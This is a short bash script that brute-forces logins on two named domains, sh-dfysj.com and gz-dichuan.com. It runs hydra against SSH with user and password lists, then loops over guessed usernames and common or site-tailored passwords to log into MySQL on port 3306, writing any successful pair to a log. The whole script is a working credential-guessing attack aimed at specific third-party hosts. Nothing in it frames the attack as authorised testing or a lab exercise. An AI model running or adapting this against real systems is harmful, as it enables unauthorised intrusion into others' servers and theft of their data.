#!/bin/bash
# brute force: ssh + mysql on targets
LOG=/tmp/brute.log
echo "=== BRUTE START $(date) ===" >> $LOG

# 1. SSH sh-dfysj (multi-user)
echo "--- SSH sh-dfysj ---" >> $LOG
timeout 400 hydra -L /tmp/ssh_users.txt -P /tmp/pw.txt -t 4 -W 5 -f -o /tmp/hydra_ssh_sd.txt ssh://sh-dfysj.com >> /tmp/hydra_ssh_out.txt 2>&1
grep -i "valid password\|host:" /tmp/hydra_ssh_sd.txt >> $LOG 2>/dev/null
echo "SSH_DONE" >> $LOG

# 2. MySQL gz-dichuan
echo "--- MySQL gz-dichuan ---" >> $LOG
for u in root gz_dichuan dichuan gzdichuan gz_dichuan_com; do
  for pw in 123456 admin admin123 gz123456 dichuan123 root123 123456789 888888 666666 123123 admin888 root root123456; do
    timeout 6 mysql -h gz-dichuan.com -P 3306 -u "$u" -p"$pw" -e "select 1" >/dev/null 2>&1
    if [ $? -eq 0 ]; then echo "MYSQL_HIT gz-dichuan $u/$pw" >> $LOG; fi
  done
done
echo "MYSQL_GZ_DONE" >> $LOG

# 3. MySQL sh-dfysj
echo "--- MySQL sh-dfysj ---" >> $LOG
for u in root dengfeng admin dfysj; do
  for pw in 123456 admin admin123 df123456 dengfeng123 123456789 root123 888888 root root123456; do
    timeout 6 mysql -h sh-dfysj.com -P 3306 -u "$u" -p"$pw" -e "select 1" >/dev/null 2>&1
    if [ $? -eq 0 ]; then echo "MYSQL_HIT sh-dfysj $u/$pw" >> $LOG; fi
  done
done
echo "MYSQL_SD_DONE" >> $LOG

echo "=== BRUTE END $(date) ===" >> $LOG
